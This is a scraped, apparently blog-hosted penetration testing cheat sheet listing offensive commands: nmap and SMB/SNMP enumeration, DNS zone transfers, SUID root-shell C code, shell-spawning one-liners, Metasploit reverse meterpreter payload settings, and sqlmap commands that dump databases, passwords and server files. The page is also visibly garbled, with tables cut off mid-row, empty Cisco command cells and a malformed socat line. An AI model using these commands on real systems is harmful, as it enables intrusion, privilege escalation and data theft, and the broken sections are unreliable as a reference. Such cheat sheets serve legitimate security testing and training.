            <div class="entry-content">
                

<p>
This Penetration Testing Cheatsheet, covering key areas and commands
across various tools and techniques. It's organized by category and
designed to offer a quick reference for penetration testers. Whether
you're a beginner or an experienced pentester, this cheat sheet has got
you covered.
</p>
<p>
</p>

:::::: wp-block-jetpack-markdown

Penetration Testing Cheat Sheet

enumeration to gather valuable information about your
target.`</strong>`{=html}

</li>

<h2>
Recon and Enumeration
</h2>
<h3>
NMAP Commands
</h3>
<p>
Nmap ("Network Mapper") is a free and open-source utility for network
discovery and security auditing. It's a versatile tool used by both
systems and network administrators for tasks like network inventory,
managing service upgrade schedules, and monitoring host or service
uptime. Nmap runs on all major computer operating systems, and official
binary packages are available for Linux, Windows, and Mac OS X.
</p>
<table>
<thead>
<tr>
<th>
Command
</th>
<th>
Description
</th>
</tr>
</thead>
<tbody>
<tr>
<td>
`<code>`{=html}nmap -v -sS -A -T4 target`</code>`{=html}
</td>
<td>
Nmap verbose scan, runs syn stealth, T4 timing, OS and service version
info, traceroute and scripts against services.
</td>
</tr>
<tr>
<td>
`<code>`{=html}ping sweep sudo nmap -pn target`</code>`{=html}
</td>
<td>
Does a ping sweep over the target's network to see all the available
IPs.
</td>
</tr>
<tr>
<td>
`<code>`{=html}nmap -v -sS -p--A -T4 target`</code>`{=html}
</td>
<td>
As above but scans all TCP ports (takes a lot longer).
</td>
</tr>
<tr>
<td>
`<code>`{=html}nmap -v -sU -sS -p- -A -T4 target`</code>`{=html}
</td>
<td>
As above but scans all TCP ports and UDP scan (takes even longer).
</td>
</tr>
<tr>
<td>
`<code>`{=html}nmap -v -p 445 --script=smb-check-vulns
--script-args=unsafe=1 192.168.1.X`</code>`{=html}
</td>
<td>
Nmap script to scan for vulnerable SMB servers.
</td>
</tr>
<tr>
<td>
`<code>`{=html}nmap localhost`</code>`{=html}
</td>
<td>
Displays all the ports that are currently in use.
</td>
</tr>
<tr>
<td>
`<code>`{=html}ls /usr/share/nmap/scripts/\* \| grep ftp`</code>`{=html}
</td>
<td>
Search nmap scripts for keywords.
</td>
</tr>
</tbody>
</table>
<hr>
<h3>
SMB Enumeration
</h3>
<p>
In computer networking, Server Message Block (SMB) operates as an
application-layer network protocol mainly used for providing shared
access to files, printers, and serial ports.
</p>
<table>
<thead>
<tr>
<th>
Command
</th>
<th>
Description
</th>
</tr>
</thead>
<tbody>
<tr>
<td>
`<code>`{=html}nbtscan 192.168.1.0/24`</code>`{=html}
</td>
<td>
Discover Windows / Samba servers on subnet, finds Windows MAC addresses,
netbios name and discover client workgroup / domain.
</td>
</tr>
<tr>
<td>
`<code>`{=html}enum4linux -a target-ip`</code>`{=html}
</td>
<td>
Do Everything, runs all options (find windows client domain / workgroup)
apart from dictionary based share name guessing.
</td>
</tr>
<tr>
<td>
`<code>`{=html}smbclient -L target-ip`</code>`{=html}
</td>
<td>
Lists all SMB shares available on the target machine.
</td>
</tr>
<tr>
<td>
`<code>`{=html}smbget -R smb://target-ip/share`</code>`{=html}
</td>
<td>
Recursively downloads files from an SMB share.
</td>
</tr>
<tr>
<td>
`<code>`{=html}rpcclient -U \"\" target-ip`</code>`{=html}
</td>
<td>
Connects to an SMB server using an empty username and lists available
commands.
</td>
</tr>
<tr>
<td>
`<code>`{=html}showmount -e target-ip`</code>`{=html}
</td>
<td>
Shows the available shares on the target machine, useful for NFS.
</td>
</tr>
<tr>
<td>
`<code>`{=html}smbmap -H target-ip`</code>`{=html}
</td>
<td>
Shows share permissions of the target.
</td>
</tr>
<tr>
<td>
`<code>`{=html}smbstatus`</code>`{=html}
</td>
<td>
Lists current Samba connections. Useful when run on the target machine.
</td>
</tr>
</tbody>
</table>
<hr>
<h3>
Other Host Discovery Methods
</h3>
<p>
Other methods of host discovery that don't use Nmap.
</p>
<table>
<thead>
<tr>
<th>
Command
</th>
<th>
Description
</th>
</tr>
</thead>
<tbody>
<tr>
<td>
`<code>`{=html}netdiscover -r 192.168.1.0/24`</code>`{=html}
</td>
<td>
Discovers IP, MAC Address and MAC vendor on the subnet from ARP.
</td>
</tr>
<tr>
<td>
`<code>`{=html}arp-scan --interface=eth0 192.168.1.0/24`</code>`{=html}
</td>
<td>
ARP scan to discover hosts on the local network.
</td>
</tr>
<tr>
<td>
`<code>`{=html}fping -g 192.168.1.0/24`</code>`{=html}
</td>
<td>
Sends ICMP echo requests to multiple hosts to check if they are alive.
</td>
</tr>
<tr>
<td>
`<code>`{=html}masscan -p1-65535,U:1-65535 192.168.1.0/24
--rate=1000`</code>`{=html}
</td>
<td>
Scans all ports at a high rate, useful for initial discovery.
</td>
</tr>
</tbody>
</table>
<hr>
<h2>
Python Local Web Server
</h2>
<p>
Python local web server command, handy for serving up shells and
exploits on an attacking machine.
</p>
<table>
<thead>
<tr>
<th>
Command
</th>
<th>
Description
</th>
</tr>
</thead>
<tbody>
<tr>
<td>
`<code>`{=html}python -m SimpleHTTPServer 80`</code>`{=html}
</td>
<td>
Run a basic HTTP server, great for serving up shells etc.
</td>
</tr>
<tr>
<td>
`<code>`{=html}python3 -m http.server 80`</code>`{=html}
</td>
<td>
Run a basic HTTP server using Python 3.
</td>
</tr>
<tr>
<td>
`<code>`{=html}python -m SimpleHTTPServer 80 --bind
192.168.1.2`</code>`{=html}
</td>
<td>
Bind the server to a specific IP address.
</td>
</tr>
</tbody>
</table>
<hr>
<h2>
Mounting File Shares
</h2>
<p>
How to mount NFS / CIFS, Windows and Linux file shares.
</p>
<table>
<thead>
<tr>
<th>
Command
</th>
<th>
Description
</th>
</tr>
</thead>
<tbody>
<tr>
<td>
`<code>`{=html}mount 192.168.1.1:/vol/share /mnt/nfs`</code>`{=html}
</td>
<td>
Mount NFS share to `<code>`{=html}/mnt/nfs`</code>`{=html}.
</td>
</tr>
<tr>
<td>
`<code>`{=html}mount -t cifs -o username=user,password=pass,domain=blah
//192.168.1.X/share-name /mnt/cifs`</code>`{=html}
</td>
<td>
Mount Windows CIFS / SMB share on Linux at
`<code>`{=html}/mnt/cifs`</code>`{=html}.
</td>
</tr>
<tr>
<td>
`<code>`{=html}net use Z: \\win-server`\share `{=tex}password
/user:domain`\janedoe `{=tex}/savecred /p:no`</code>`{=html}
</td>
<td>
Mount a Windows share on Windows from the command line.
</td>
</tr>
<tr>
<td>
`<code>`{=html}apt-get install smb4k -y`</code>`{=html}
</td>
<td>
Install smb4k on Kali, useful Linux GUI for browsing SMB shares.
</td>
</tr>
<tr>
<td>
`<code>`{=html}smbclient -L //192.168.1.X -U username`</code>`{=html}
</td>
<td>
List SMB shares available on a Windows machine.
</td>
</tr>
</tbody>
</table>
<hr>
<h2>
Basic FingerPrinting
</h2>
<p>
A device fingerprint or machine fingerprint or browser fingerprint is
information collected about a remote computing device for the purpose of
identification.
</p>
<table>
<thead>
<tr>
<th>
Command
</th>
<th>
Description
</th>
</tr>
</thead>
<tbody>
<tr>
<td>
`<code>`{=html}nc -v 192.168.1.1 25`</code>`{=html}
</td>
<td>
Basic versioning / fingerprinting via displayed banner.
</td>
</tr>
<tr>
<td>
`<code>`{=html}telnet 192.168.1.1 25`</code>`{=html}
</td>
<td>
Another method for basic versioning / fingerprinting.
</td>
</tr>
<tr>
<td>
`<code>`{=html}curl -I http://192.168.1.1`</code>`{=html}
</td>
<td>
Fetch HTTP headers for fingerprinting the web server.
</td>
</tr>
<tr>
<td>
`<code>`{=html}nmap -O 192.168.1.1`</code>`{=html}
</td>
<td>
Perform OS detection using Nmap.
</td>
</tr>
<tr>
<td>
`<code>`{=html}whatweb 192.168.1.1`</code>`{=html}
</td>
<td>
Identify web technologies in use on the target.
</td>
</tr>
</tbody>
</table>
<hr>
<h2>
SNMP Enumeration
</h2>
<p>
SNMP enumeration is the process of using SNMP to enumerate user accounts
on a target system.
</p>
<table>
<thead>
<tr>
<th>
Command
</th>
<th>
Description
</th>
</tr>
</thead>
<tbody>
<tr>
<td>
`<code>`{=html}snmpcheck -t 192.168.1.X -c public`</code>`{=html}
</td>
<td>
SNMP enumeration
</td>
</tr>
<tr>
<td>
`<code>`{=html}snmpwalk -c public -v1 192.168.1.X 1`</code>`{=html}
</td>
<td>
SNMP enumeration
</td>
</tr>
<tr>
<td>
`<code>`{=html}snmpenum -t 192.168.1.X`</code>`{=html}
</td>
<td>
SNMP enumeration
</td>
</tr>
<tr>
<td>
`<code>`{=html}onesixtyone -c names -i hosts`</code>`{=html}
</td>
<td>
SNMP enumeration
</td>
</tr>
<tr>
<td>
`<code>`{=html}snmpbulkwalk -v2c -c public -Cn0 -Cr10
192.168.1.X`</code>`{=html}
</td>
<td>
Bulk SNMP enumeration
</td>
</tr>
</tbody>
</table>
<hr>
<h2>
DNS Zone Transfers
</h2>
<table>
<thead>
<tr>
<th>
Command
</th>
<th>
Description
</th>
</tr>
</thead>
<tbody>
<tr>
<td>
`<code>`{=html}nslookup -\> set type=any -\> ls -d
blah.com`</code>`{=html}
</td>
<td>
Windows DNS zone transfer
</td>
</tr>
<tr>
<td>
`<code>`{=html}dig axfr blah.com @ns1.blah.com`</code>`{=html}
</td>
<td>
Linux DNS zone transfer
</td>
</tr>
<tr>
<td>
`<code>`{=html}host -l blah.com ns1.blah.com`</code>`{=html}
</td>
<td>
Another Linux DNS zone transfer method
</td>
</tr>
</tbody>
</table>
<h2>
DNSRecon
</h2>
<p>
DNSRecon provides the ability to perform various DNS enumeration tasks.
</p>
<h2>

<h2>SUID Binary</h2> <h3>SUID C Shell for /bin/bash</h3> <pre><code>int main(void){        setresuid(0, 0, 0);        system(&quot;/bin/bash&quot;); } </code></pre> <h3>SUID C Shell for /bin/sh</h3> <pre><code>int main(void){        setresuid(0, 0, 0);        system(&quot;/bin/sh&quot;); } </code></pre> <h3>Building the SUID Shell binary</h3> <table> <thead> <tr> <th>Command</th> <th>Description</th> </tr> </thead> <tbody> <tr> <td><code>gcc -o suid suid.c</code></td> <td>Compile the SUID shell</td> </tr> <tr> <td><code>gcc -m32 -o suid suid.c</code></td> <td>Compile the 32-bit SUID shell</td> </tr> </tbody> </table> <hr> <h2>TTY Shells</h2> <h3>Python TTY Shell Trick</h3> <p><code>python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'</code></p> <p><code>python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'</code></p> <h3>Spawn Interactive sh shell</h3> <p><code>/bin/sh -i</code></p> <h3>Spawn Perl TTY Shell</h3> <p><code>perl -e 'exec &quot;/bin/sh&quot;;'</code></p> <h3>Spawn Ruby TTY Shell</h3> <p><code>ruby -e 'exec &quot;/bin/sh&quot;'</code></p> <h3>Spawn Lua TTY Shell</h3> <p><code>lua -e 'os.execute(&quot;/bin/sh&quot;)'</code></p> <h3>Spawn TTY Shell from Vi</h3> <p><code>:!bash</code></p> <h3>Spawn TTY Shell from NMAP</h3> <p><code>!sh</code></p> <h3>Spawn TTY Shell from awk</h3> <p><code>awk 'BEGIN {system(&quot;/bin/sh&quot;)}'</code></p> <h3>Spawn TTY Shell from socat</h3> <h2><code>socat file:</code>tty<code>,raw,echo=0 tcp-listen:4444</code></h2> <h2>Metasploit</h2> windows/vncinject/reverse_tcp</code></p> <p><code>set ViewOnly false</code></p> <h4>Linux Reverse Meterpreter payload</h4> <p><code>set payload linux/meterpreter/reverse_tcp</code></p> <h4>Android </tr> <tr> <td>/8</td> <td>255.0.0.0</td> <td>16777214 Hosts</td> </tr> </tbody> </table> <hr> <h2>ASCII Table Cheat Sheet</h2> <p>Useful for Web Application Penetration Testing, or if you get stranded on Mars and need to communicate with NASA.</p> <table> <thead> <tr> <th>ASCII</th> <th>Character</th> <th>ASCII</th> <th>Character</th> <th>ASCII</th> <th>Character</th> <th>ASCII</th> <th>Character</th> </tr> </thead> <tbody> <tr> <td>x00</td> <td>Null Byte</td> <td>x08</td> <td>BS</td> <td>x09</td> <td>TAB</td> <td>x0a</td> <td>LF</td> </tr> <tr> <td>x0d</td> <td>CR</td> <td>x1b</td> <td>ESC</td> <td>x20</td> <td>SPC</td> <td>x21</td> <td>!</td> </tr> <tr> <td>x22</td> <td>&quot;</td> <td>x23</td> <td>#</td> <td>x24</td> <td>$</td> <td>x25</td> <td>%</td> </tr> <tr> <h2>
Cisco IOS Commands
</h2>
<table>

<th>

</th>
<th>
Description
</th>
</tr>

<tr>

</td>
<td>
Enters enable mode
</td>
</tr>
<tr>
<td>
`<code>`{=html}conf t`</code>`{=html}
</td>
<td>
Short for, configure terminal
</td>
</tr>
<tr>
<td>
`<code>`{=html}(config)# interface fa0/0`</code>`{=html}
</td>
<td>
Configure FastEthernet 0/0
</td>
</tr>
<tr>
<td>
`<code>`{=html}(config-if)# ip addr 0.0.0.0
255.255.255.255`</code>`{=html}
</td>
<td>
Add IP to fa0/0
</td>
</tr>
<tr>
<td>
`<code>`{=html}(config-if)# line vty 0 4`</code>`{=html}
</td>
<td>
Configure vty line
</td>
</tr>
<tr>
<td>

</td>
<td>
Cisco set telnet password
</td>
</tr>
<tr>

</td>
<td>
Set telnet password
</td>
</tr>
<tr>
<td>

</td>
<td>
Show running config loaded in memory
</td>

</td>
<td>
Show startup config
</td>

</td>
<td>

</td>

</td>

</td>

</td>

Show network interfaces
</td>

</td>

<h2>
SQLMap Examples
</h2>
<table>
<thead>
<tr>
<th>
Command
</th>
<th>
Description
</th>
</tr>
</thead>
<tbody>
<tr>
<td>
`<code>`{=html}sqlmap -u http://meh.com --forms --batch --crawl=10
--cookie=jsessionid=54321 --level=5 --risk=3`</code>`{=html}
</td>
<td>
Automated sqlmap scan
</td>
</tr>
<tr>
<td>
`<code>`{=html}sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE
--level=3 --current-user --current-db --passwords
--file-read=\"/var/www/blah.php\"`</code>`{=html}
</td>
<td>
Targeted sqlmap scan
</td>
</tr>
<tr>
<td>
`<code>`{=html}sqlmap -u \"http://meh.com/meh.php?id=1\" --dbms=mysql
--tech=U --random-agent --dump`</code>`{=html}
</td>
<td>
Scan URL for union + error-based injection with MySQL backend and use a
random user agent + database dump
</td>
</tr>
<tr>
<td>
`<code>`{=html}sqlmap -o -u \"http://meh.com/form/\"
--forms`</code>`{=html}
</td>
<td>
SQLMap check form for injection
</td>
</tr>
<tr>
<td>
`<code>`{=html}sqlmap -o -u \"http://meh/vuln-form\" --forms -D
database-name -T users --dump`</code>`{=html}
</td>
<td>
SQLMap dump and crack hashes for table users on database-name
</td>
</tr>
</tbody>
</table>

                <h2 class="cs-entry__title"><a href="https://awjunaid.com/cheatsheet/ultimate-dns-cheat-sheet/">Ultimate DNS Cheat Sheet</a></h2>
                                    <div class="cs-entry__excerpt">
                        Introduction The Domain Name System (DNS) is a hierarchical and decentralized naming system for computers, services, or any&hellip;                 </div>
                
                            <div class="cs-entry__details ">
                                    <div class="cs-entry__details-data">

                                                            <div class="cs-entry__details-meta">
                            <div class="cs-entry__author-meta"><a href="https://awjunaid.com/author/awjunaid/">Abdul Wahab Junaid</a></div><div class="cs-entry__post-meta"><div class="cs-meta-date">September 21, 2023</div></div>                        </div>
